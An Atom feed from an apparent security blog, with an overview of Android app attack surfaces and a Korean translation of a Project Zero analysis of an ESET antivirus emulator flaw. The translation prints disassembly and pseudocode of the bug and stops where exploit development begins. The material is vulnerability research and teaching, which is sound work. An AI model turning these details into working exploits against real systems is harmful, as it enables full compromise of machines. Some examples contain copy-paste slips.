<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[99 Cruster]]></title>
  <link href="http://binerdd.github.io/atom.xml" rel="self"/>
  <link href="http://binerdd.github.io/"/>
  <updated>2015-12-31T23:29:04+09:00</updated>
  <id>http://binerdd.github.io/</id>
  <author>
    <name><![CDATA[binerdd]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Overview of Attack Surfaces in Android Apps]]></title>
    <link href="http://binerdd.github.io/blog/2015/08/11/what-is-an-android-service/"/>
    <updated>2015-08-11T21:35:46+09:00</updated>
    <id>http://binerdd.github.io/blog/2015/08/11/what-is-an-android-service</id>
    <content type="html"><![CDATA[<p>When auditing the security of Android apps, it is crucial to enumerate attack surfaces available. There are 3 main attack surfaces available in an Android app: Service, Broadcast Receiver, Content Provider.</p>

<h1>Android Service</h1>

<p>According to <a href="http://developer.android.com/reference/android/app/Service.html">Google</a>, a service is an application component representing either an application&rsquo;s desire to perform a longer-running operation while not interacting with the user or to supply functionality for other applications to use. So it can be thought as background process without an graphical interface.</p>

<p>Service can be either started or bound. When a service is started, it</p>

<p>When auditing, one can check which services are available by searching for <code>&lt;service&gt;</code> element tag in <code>AndroidManifest.xml</code> file. There can be many or none, but it is important to distinguish which service is actually reachable from outside the app.</p>

<h2>Finding out which services are reachable</h2>

<p>Example of a service is as follows:</p>

<p>As you can see, services have attributes that need to be considered before digging deep in to the code. Certain attributes make services not interactable. For a complete reference, checkout <a href="http://developer.android.com/guide/topics/manifest/service-element.html">android API guide</a>.</p>

<h4>android:exported</h4>

<p>This attribute defines whether this service is exported outside so that components of other apps can interact with it. If this attribute is set to <code>False</code>, there is no need to investigate further. Default value is <code>True</code>.</p>

<h4>android:enabled</h4>

<p>Although not shown in previous examples, if this value set to false then this service cannot be instantiated, meaning it cannot be run. Default value is <code>True</code>.</p>

<h4>android:permission</h4>

<p>This attribute sets name of the permission an entitiy must have in order to lauch or bind with the service. If this options is not set, service inherits permission set by <code>&lt;application&gt;</code> element. Therefore if we don&rsquo;t have the specified permission, we cannot interact with the service.</p>

<h4>android:name</h4>

<p>This is the name of the <code>Service</code> subclass that implements the service. When a service is reachable from outside and it is worth looking at closely, value of <code>android:name</code> must be searched inside the decompiled code.</p>

<h2>Example</h2>

<div class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;service</span> <span class="na">android:exported=</span><span class="s">&quot;false&quot;</span> <span class="na">android:name=</span><span class="s">&quot;.FotaRegisterService&quot;</span><span class="nt">&gt;</span>
    <span class="nt">&lt;intent-filter&gt;</span>
        <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&quot;com.sec.android.fotaclient&quot;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/intent-filter&gt;</span>
<span class="nt">&lt;/service&gt;</span></code></pre></div>


<h1>Broadcast Receivers</h1>

<p>Broadcast Receivers receive intents that are broadcasted by the system or other apps. Broadcast Receivers can be statically declared in the <code>AndroidManifest.xml</code> or dynamically in the code by <code>Context.registerReceiver()</code> method. Because it processes external data(which is intent), it is an another attack surface that should be looked closely. Difference between starting a service is that intent has a specific target(service) wheras broadcast does not have a specific destination and it is up to the broadcast receiver to process it or not.</p>

<h2>Finding out which broascast receivers are reachable</h2>

<p>Unfortunately, it is same for broadcast receivers that attributes must be looked at closely in order to distinguish receivers that is reachable from the outside. For a full reference of the attributes, refer to the <a href="http://developer.android.com/guide/topics/manifest/receiver-element.html">android API guide</a>.</p>

<h4>android:exported</h4>

<p>This attribute defines whether the broadcast receiver can receive broadcast from outside of the application. Set to <code>True</code> if it can, <code>False</code> if not.</p>

<h4>android:enabled</h4>

<p>If this value set to <code>false</code> then this receiver cannot be instantiated, meaning it cannot be run. Default value is <code>True</code>.</p>

<h4>android:permission</h4>

<p>This is the name of a permission that broascasters must have in order to send broadcasts to this specific receiver. Therefore, without this permission it is impossible to trigger the vulnereability in the receiver. If it is not set, recevier inherits permission set by the <code>&lt;application&gt;</code> element&rsquo;s <code>permission</code> attribute. If neither is set, no permission is needed to send broadcasts.</p>

<h4>android:name</h4>

<p>This is the name of the class that implements the broadcast receiver. Value of <code>android:name</code> should be searched inside the code in order to look more deeply.</p>

<h2>Example</h2>

<div class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;receiver</span> <span class="na">android:exported=</span><span class="s">&quot;false&quot;</span> <span class="na">android:name=</span><span class="s">&quot;.FotaRegisterService&quot;</span><span class="nt">&gt;</span>
    
<span class="nt">&lt;/receiver&gt;</span></code></pre></div>


<h1>Content Providers</h1>

<p><code>&lt;provider&gt;</code> element declares a content provider component. Content provider provides structured access to data managed by the application. Data can be accessed by using URIs defined in the <code>android:authorities</code> element in the manifest file. If content provider is not appropriately secured by setting attributes, its contents can be leaked.</p>

<h2>Finding out which content providers are reachable</h2>

<p>Below are attributes that must be considered before diving into the provider for possible leakage of data. These define whether it is accessible from outside the app, etc.</p>

<h4>android:authorities</h4>

<p>This attribute lists URI authorities that identify data offered by the content provider. Naming convention is using full package name and the provider name.</p>

<p>Example: <code>com.example.provider.providername</code></p>

<p>Authority name is usually the name of the class that implements <code>ContentProvider</code>.</p>

<h4>android:enabled</h4>

<p>If this value set to <code>false</code> then this content provider cannot be instantiated, meaning it cannot be run. Default value is <code>True</code>.</p>

<p><code>&lt;application&gt;</code> element has its own <code>enabled</code> attribute that applies to all of the application components. Therefore <code>enabled</code> attribute of <code>&lt;application&gt;</code> and <code>&lt;provider&gt;</code> must equal to <code>true</code> in order to be enabled.</p>

<h4>android:exported</h4>

<p>This attribute defines whether the provider is available to other applications. Set to <code>True</code> if it can, <code>False</code> to only allow applications that have same user ID(UID).</p>

<h4>android:permission</h4>

<p>Defines name of the permission that one must have in order to read/write to the data. However, permission defined here is overwritten by <code>android:readPermssion</code> and <code>android:writePermission</code>.</p>

<h2>Example</h2>

<div class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;provider</span> <span class="na">android:exported=</span><span class="s">&quot;false&quot;</span> <span class="na">android:name=</span><span class="s">&quot;.FotaRegisterService&quot;</span><span class="nt">&gt;</span>
    
<span class="nt">&lt;/provider&gt;</span></code></pre></div>


<h1>Reference</h1>

<p><a href="http://translate.wooyun.io/2015/08/05/Android-Service-Security.html">http://translate.wooyun.io/2015/08/05/Android-Service-Security.html</a>
<a href="http://translate.wooyun.io/2015/07/22/Android-Broadcast-Security.html">http://translate.wooyun.io/2015/07/22/Android-Broadcast-Security.html</a>
<a href="http://developer.android.com/">http://developer.android.com/</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[(번역)Analysis and Exploitation of an ESET Vulnerability]]></title>
    <link href="http://binerdd.github.io/blog/2015/07/10/analysis-and-exploitation-of-eset-vulnerability-kor/"/>
    <updated>2015-07-10T07:00:25+09:00</updated>
    <id>http://binerdd.github.io/blog/2015/07/10/analysis-and-exploitation-of-eset-vulnerability-kor</id>
    <content type="html"><![CDATA[<p><a href="http://googleprojectzero.blogspot.kr/2015/06/analysis-and-exploitation-of-eset.html">original post</a></p>

<h3>우리는 보안 소프트웨어의 위험성(risk)과 이익(benefit) 사이의 트레이드오프 관계를 이해하고 있는가?</h3>

<p>Tavis Ormandy, 2015년 6월</p>

<h1>소개</h1>

<p>많은 백신 제품들은 언패커들을 몇 사이클 정도 실행시킨 후에 시그니처를 적용하기 위해 에뮬레이션 기능을 포함하고 있다. ESET NOD32 제품은 <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff557282(v=vs.85">minifilter</a>.aspx) 또는 <a href="https://developer.apple.com/library/mac/documentation/Darwin/Conceptual/KEXTConcept/KEXTConceptIntro/introduction.html">kext</a>를 이용하여 실행가능한 코드가 탐지되면 디스크 I/O를 가로챈 후 분석 및 에뮬레이트를 한다.</p>

<p>공격자들은 웹브라우저, 이메일, 인스턴트메신저(IM), 파일공유, 네트워크저장소, USB 외에도 수백개의 다른 벡터를 통해서 I/O를 발생시킬 수 있다. 메시지나 파일, 이미지 또는 다른 데이터들을 수신할 때마다 신뢰할 수 없는 데이터가 디스크를 거쳐갈 가능성은 항상 열려있다. 신뢰할 수 없는 코드의 에뮬레이션을 유발하는 것은 공격자들에겐 너무나 쉽기 때문에 에뮬레이터는 견고하고 분리되어있어야 한다.</p>

<p>하지만 ESET의 에뮬레이션 기능을 분석해본 결과, 안전하지가 않다는 것을 밝혀냈으며 쉽게 공격을 당하거나 악용될 수 있다. 본 보고서는 ESET의 원격에서 루트권한을 탈취할 수 있는 익스플로잇 개발에 대한 내용을 설명하며, 공격자들이 어떻게 ESET 사용자들에 대한 보안을 훼손시킬 수 있는지를 보여준다. 이것은 이론적인 위험이 아니라 충분히 실제로 일어날 수 있으며, 최근 <a href="https://firstlook.org/theintercept/2015/06/22/nsa-gchq-targeted-kaspersky/">근거</a>를 통해 실력이 뛰어난 공격자들이 백신 제품에 관심을 가지기 시작한 것을 알 수 있다.</p>

<h1>FAQ</h1>

<h3>어떤 플랫폼들이 영향을 받는가?</h3>

<p>ESET 시그니처들의 형태는 실행가능한 코드이며, DAT와 NUP파일로부터 런타임에 언패킹되어 모듈로 로드된다. DAT 파일은 모든 플랫폼 및 버전들이 공유하기 때문에, 결과적으로 모든 플랫폼이 영향을 받는다.</p>

<h3>어떤 제품 및 버전이 영향을 받는가?</h3>

<p>현재 지원대상인 모든 ESET 버전 및 에디션은 취약한 코드를 모두 공유한다.</p>

<p>아래는 취약한 제품들 중 일부 목록이다.</p>

<ul>
<li>ESET Smart Security for Windows</li>
<li>ESET NOD32 Antivirus for Windows</li>
<li>ESET Cyber Security Pro for OS X</li>
<li>ESET NOD32 For Linux Desktop</li>
<li>ESET Endpoint Security for Windows and OS X</li>
<li>ESET NOD32 Business Edition</li>
</ul>


<h3>기본(default) 설정도 영향을 받는가?</h3>

<p>영향을 받는다.</p>

<h3>&ldquo;실시간 스캔&rdquo; 기능을 비활성화 시켜도 취약한가?</h3>

<p>만약 실시간 스캔 기능을 비활성화시킨다면, 컨텍스트 메뉴나 GUI 상에서 수동으로 파일을 스캔할 경우에만 영향을 받는다.</p>

<p>하지만 기억할 점은, 실시간 스캔을 비활성화시키면 ESET가 주기적으로 최대한의 보호를 받고 있지 못하다는 알림을 띄워 실시간 스캔을 활성화시키도록 유도할 것이다.</p>

<h3>분석을 위해 익스플로잇을 공개했는가?</h3>

<p>실제로 동작하는 <a href="https://code.google.com/p/google-security-research/issues/detail?id=456">익스플로잇</a>을 보고서와 함께 첨부했다.</p>

<h3>업데이트는 공개되었는가?</h3>

<p>ESET는 스캔 엔진에 대한 <a href="http://www.virusradar.com/en/update/info/11824">업데이트</a>를 2015년 6월 22일에 배포했다.</p>

<h1>영향</h1>

<p>ESET을 실행하고 있는 네트워크에 연결된 컴퓨터라면, 완전히 보안성을 훼손 당할 수 있다. 완전하게 보안성이 훼손된다는 의미는, 접근권한과 무관하게 시스템상의 파일읽기/쓰기/수정, 루트킷 및 원하는 프로그램 설치, 카메라/마이크로폰/스캐너 등의 하드웨어 장비에 접근, 시스템의 모든 활동(키스트로크, 네트워크 트래픽)의 로깅 등이 모두 가능하다는 말이다.</p>

<p>완전히 보안성이 훼손당했다는 증거(익스플로잇이 실행되었다는 증거)는 전혀 사용자에게 나타나지 않는다. 왜냐면 disk I/O는 운영체제의 일반적인 행위의 일부분이기 때문이다. 또한 익스플로잇을 하기 위해 사용자의 개입이 전혀 필요없기 때문에 이 취약점은 <a href="https://en.wikipedia.org/wiki/Computer_worm">웜</a>으로 악용될 수 있다. ESET를 배포하여 사용하고 있는 기업환경에서는 아주 빠르게 전파되어 순식간에 기업전체가 보안성을 훼손당할 수 있으며 사업관련 데이터, PII, 영업비밀, 백업, 회계문서 등이 모두 유출되거나 삭제될 수 있다.</p>

<p>이 모든것은 스캔 작업자체가 높은 권한을 가지고 있기 때문에 가능한 시나리오다. 윈도우 네트워크의 경우, ekm.exe 프로세스를 장악하여 공격자에게 NT AUTHORITY\SYSTEM 권한을 부여할 수 있다. 맥과 리눅스는 esets_daemon 프로세스를 장악하여 공격자에게 루트권한을 부여할 수 있다.</p>

<p>Figure 1.은 익스플로잇 시나리오를 설명하는 비디오다. 일반적인 사용자가 ESET NODE32 비지니스 에디션을 설치한 환경(기본설정)에서 링크를 클릭할 경우, 공격자는 루트권한으로 임의의 명령어를 실행할 수 있다. 악성 링크가 유일한 공격벡터는 아니며, 수백개의 가능한 벡터중 하나를 설명한 것에 불과하다.</p>

<p>모든 버전,플랫폼 및 제품들은 기본설정 환경에서 영향을 받으며, 익스플로잇 시나리오와 가능한 익스플로잇 페이로드들에 대한 더 많은 예제를 알고 싶다면, 아래 &ldquo;Sample Payloads"를 참고하면 된다.</p>

<iframe width="420" height="315" src="https://www.youtube.com/embed/Sk-CuFMXods" frameborder="0" allowfullscreen></iframe>


<p>Figure 1. ESET 기본설치 환경에서 웹브라우저를 통한 공격 시나리오 동영상 <a href="http://youtu.be/Sk-CuFMXods">http://youtu.be/Sk-CuFMXods</a></p>

<h1>기술적인 분석</h1>

<p>위 Figure 1에서 익스플로잇한 취약점은 에뮬레이트된 스택 작업들을 섀도우(또는 복제)하는 ESET NOD32 시그니처에 존재한다. 시그니처는 최소 3개의 섹션과 IMAGE_SECTION_HEADER의 IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE 속성이 필요하다.</p>

<p>엔트리포인트의 첫번째 명령어는 CALL이 필수이며, CALL은 PUSHA 명령어와 PUSHF 명령어가 연속으로 존재하는 곳으로 분기해야 한다.</p>

<p>이 조건들이 만족된다면, 시그니처는 x86 에뮬레이터 상에서 80,000 사이클 동안 코드를 single-step 한다. 각각의 명령어를 실행한 후에는 바로전에 실행한 명령어의 opcode가 스택 작업이였는지 체크한다. 만약 스택 작업이였다면, PUSH, POP 그리고 ESP 레지스터에 대한 산술연산을 자신의 40 바이트 스택 버퍼에 그대로 섀도우한다. 섀도우 스택의 목적은 악성코드들이 일반적으로 메모리에 쓴다고 알려진 값들이 PUSHA;PUSHF 명령어로 할당된 공간에 써지는지 확인하여 악성코드를 탐지하는 것이다. 이런 목적 때문에 40 바이트밖에 안되는 작은 섀도우 스택을 사용하는 것으로 예상되며, 아마도 엔트리포인트 난독화를 탐지하는 방법인 것 같다.</p>

<p>아래는 ESP에 대한 산술연산을 섀도우하는 코드이다.</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">load:</span><span class="nf">F33E0BD3</span> <span class="nb">Ch</span><span class="nv">eckEspArith</span><span class="p">:</span>                       
<span class="nl">load:</span><span class="nf">F33E0BD3</span>                 <span class="nv">cmp</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mi">6</span>  <span class="p">(</span><span class="nv">a</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BD6</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0C06</span>
<span class="nl">load:</span><span class="nf">F33E0BD8</span>                 <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="mi">1</span>
<span class="nl">load:</span><span class="nf">F33E0BDF</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0C06</span>
<span class="nl">load:</span><span class="nf">F33E0BE1</span>                 <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand</span><span class="p">],</span> <span class="mh">124h</span>
<span class="nl">load:</span><span class="nf">F33E0BEB</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0C06</span>
<span class="nl">load:</span><span class="nf">F33E0BED</span>                 <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand1</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="mi">9</span>
<span class="nl">load:</span><span class="nf">F33E0BF1</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0C06</span>
<span class="nl">load:</span><span class="nf">F33E0BF3</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand1</span><span class="o">+</span><span class="mh">24h</span><span class="p">]</span> <span class="p">(</span><span class="nv">b</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BF6</span>                 <span class="nv">shr</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span>
<span class="nl">load:</span><span class="nf">F33E0BF9</span>                 <span class="nv">sub</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">eax</span> <span class="p">(</span><span class="nv">c</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BFB</span>                 <span class="nv">movzx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.InstructionSize</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0BFF</span>                 <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span> <span class="p">(</span><span class="nv">d</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0C01</span>                 <span class="nv">jmp</span>     <span class="nv">InstructionComplete</span></code></pre></div>


<p>(a) 비교문은 산술연산 클래스의 명령어인지 확인하는 것이며, 그 뒤로 명령어의 인자(operand)를 확인하는 코드가 나온다. (b)에서는 상수 인자를 가져오고 &copy;는 새도우 스택 포인터에서 가져온 인자값을 뺀다. 가상 프로그램 카운터는 (d)명령어 다음 위치로 증가한다.</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">oad:</span><span class="nf">F33E0B61</span> <span class="nb">Ch</span><span class="nv">eckPush</span><span class="p">:</span>
<span class="nl">load:</span><span class="nf">F33E0B61</span>                 <span class="nv">cmp</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mh">10Eh</span>       <span class="p">(</span><span class="nv">a</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0B67</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nb">Ch</span><span class="nv">eckPop</span>
<span class="nl">load:</span><span class="nf">F33E0B69</span>                 <span class="nv">push</span>    <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.BranchRelated</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0B6F</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0B75</span>                 <span class="nv">push</span>    <span class="nb">eax</span>
<span class="nl">load:</span><span class="nf">F33E0B76</span>                 <span class="nv">call</span>    <span class="nv">GetOperand</span>      <span class="p">(</span><span class="nv">b</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0B7B</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nb">ebx</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="nv">EmulatedStack</span><span class="p">],</span> <span class="nb">eax</span> <span class="p">(</span><span class="nv">c</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0B7F</span>                 <span class="nv">inc</span>     <span class="nb">ebx</span>
<span class="nl">load:</span><span class="nf">F33E0B80</span>                 <span class="nv">movzx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.InstructionSize</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0B84</span>                 <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; Increment Program Counter</span>
<span class="nl">load:</span><span class="nf">F33E0B86</span>                 <span class="nv">cmp</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0Ah</span>        <span class="p">(</span><span class="nv">d</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0B89</span>                 <span class="nv">jb</span>      <span class="nv">InstructionComplete</span>
<span class="nl">load:</span><span class="nf">F33E0B8F</span>
<span class="nl">load:</span><span class="nf">F33E0B8F</span> <span class="nv">StackOutOfBounds</span><span class="p">:</span>                       <span class="c1">; CODE XREF: sub_F33E0A70+D7j</span>
<span class="nl">load:</span><span class="nf">F33E0B8F</span>                                         <span class="c1">; sub_F33E0A70+DFj ...</span>
<span class="nl">load:</span><span class="nf">F33E0B8F</span>                 <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">EmulatorObject</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0B92</span>                 <span class="nv">call</span>    <span class="nv">ShutdownEmulator</span></code></pre></div>


<p>(a)는 PUSH 명령어가 존재하는지 체크하는 코드이다. 인자는 에뮬레이터의 상태정보에서 가져오며(b) 이를 섀도우 스택에 저장한다&copy;. 스택포인터는 (d)에서 10 DWORDS 값과 비교해서 스택 경계를 벗어나지 않도록 한다.</p>

<p>POP 명령어도 마찬가지 패턴으로 구현되어있다.</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">load:</span><span class="nf">F33E0B9E</span> <span class="nb">Ch</span><span class="nv">eckPop</span><span class="p">:</span>                          
<span class="nl">load:</span><span class="nf">F33E0B9E</span>                 <span class="nv">cmp</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mh">0F3h</span>             <span class="p">(</span><span class="nv">a</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BA4</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0BD3</span>
<span class="nl">load:</span><span class="nf">F33E0BA6</span>                 <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="mi">1</span>  <span class="p">(</span><span class="nv">b</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BAD</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0B8F</span>
<span class="nl">load:</span><span class="nf">F33E0BAF</span>                 <span class="nv">test</span>    <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>  <span class="p">(</span><span class="nv">c</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BB1</span>                 <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc_F33E0B8F</span>
<span class="nl">load:</span><span class="nf">F33E0BB3</span>                 <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0BB9</span>                 <span class="nv">dec</span>     <span class="nb">ebx</span>
<span class="nl">load:</span><span class="nf">F33E0BBA</span>                 <span class="nv">and</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">7</span>
<span class="nl">load:</span><span class="nf">F33E0BBD</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nb">ebx</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="nv">EmulatedStack</span><span class="p">]</span> <span class="p">(</span><span class="nv">c</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BC1</span>                 <span class="nv">mov</span>     <span class="nb">ds</span><span class="p">:</span><span class="nv">EmulatedRegisters</span><span class="p">[</span><span class="nb">ecx</span><span class="o">*</span><span class="mi">4</span><span class="p">],</span> <span class="nb">eax</span>
<span class="nl">load:</span><span class="nf">F33E0BC8</span>                 <span class="nv">movzx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.InstructionSize</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0BCC</span>                 <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nl">load:</span><span class="nf">F33E0BCE</span>                 <span class="nv">jmp</span>     <span class="nv">InstructionComplete</span></code></pre></div>


<p>해당 코드는 POP 명령어를 제어하며, 명령어 클래스는 (a)에서 체크한다. 또한 레지스터에  데이터를 저장하는 명령어인지도 (b)에서 검증하며, 마지막으로 섀도우 스택 포인터가 0이 아닌지 확인한다&copy;. 왜냐면 만약 섀도우 스택 포인터가 0인 상태에서 POP 연산을 하게되면 포인터가 스택의 영역밖으로 벗어나기 때문이다.</p>

<p>버그는 새도우 스택 포인터가 스택 경계를 벗어나지 않도록 검증하는 부분이 ESP에 대한 산술연산을 이용하면 우회가 가능하다는 것이다. 아래 figure 3은 설명한 동작에 대한 pseudo 코드다.</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">DWORD</span> <span class="n">ShadowStack</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="n">DWORD</span> <span class="n">ShadowStackPointer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="k">for</span> <span class="p">(</span><span class="n">Cycles</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">Cycles</span> <span class="o">&lt;</span> <span class="mi">80000</span><span class="p">;</span> <span class="n">Cycles</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">Emulator</span><span class="o">-&gt;</span><span class="n">Step</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ProgramCounter</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Instruction</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">Instruction</span><span class="p">.</span><span class="n">Class</span> <span class="o">==</span> <span class="n">PUSH</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">ShadowStack</span><span class="p">[</span><span class="n">ShadowStackPointer</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">Emulator</span><span class="o">-&gt;</span><span class="n">GetOperandValue</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ShadowStackPointer</span> <span class="o">&gt;=</span> <span class="mi">10</span><span class="p">)</span>
            <span class="n">Emulator</span><span class="o">-&gt;</span><span class="n">Shutdown</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">Instruction</span><span class="p">.</span><span class="n">Class</span> <span class="o">==</span> <span class="n">POP</span><span class="p">)</span> <span class="p">{</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ShadowStackPointer</span> <span class="o">||</span> <span class="n">Instruction</span><span class="p">.</span><span class="n">Operand</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">Type</span> <span class="o">!=</span> <span class="n">REGISTER</span><span class="p">)</span>
            <span class="n">Emulator</span><span class="o">-&gt;</span><span class="n">Shutdown</span><span class="p">();</span>
       <span class="n">Registers</span><span class="p">[</span><span class="n">Instruction</span><span class="p">.</span><span class="n">Operand</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">Register</span><span class="p">]</span> <span class="o">=</span> <span class="n">ShadowStack</span><span class="p">[</span><span class="n">ShadowStackPointer</span><span class="o">--</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">Instruction</span><span class="p">.</span><span class="n">Class</span> <span class="o">==</span> <span class="n">ADD</span> <span class="o">&amp;&amp;</span> <span class="n">Instruction</span><span class="p">.</span><span class="n">Operand</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">Register</span> <span class="o">==</span> <span class="n">REG_ESP</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// BUG!</span>
        <span class="n">ShadowStackPointer</span> <span class="o">-=</span> <span class="n">Instruction</span><span class="p">.</span><span class="n">Operand</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">Value</span> <span class="o">/</span> <span class="mi">4</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">Emulator</span><span class="o">-&gt;</span><span class="n">Fault</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Emulator</span><span class="o">-&gt;</span><span class="n">Shutdown</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>   

<span class="n">Emulator</span><span class="o">-&gt;</span><span class="n">Shutdown</span><span class="p">();</span></code></pre></div>


<p>Figure 3. 에뮬레이션 루틴에 대한 Pseudo 코드</p>

<p>이와 같은 3 종류의 새도우 스택 동작을 이용하면, 익스플로잇의 기본요소(primitive)인 임의의 데이터를 원하는 위치에 쓰는 행위가 가능하여 결과적으로 에뮬레이터를 제어할 수 있다. 본 보고서의 뒷부분에서는 이 취약점을 이용하는 익스플로잇을 어떻게 개발하는지, 그리고 신뢰성이 높고 특정 플랫폼에 국한되지 않는(cross-platform) 익스플로잇을 개발하기 위해 극복해야하는 제한 및 한계를 다룬다.</p>

<h3>익스플로잇 기본요소(primitive) 구축하기</h3>

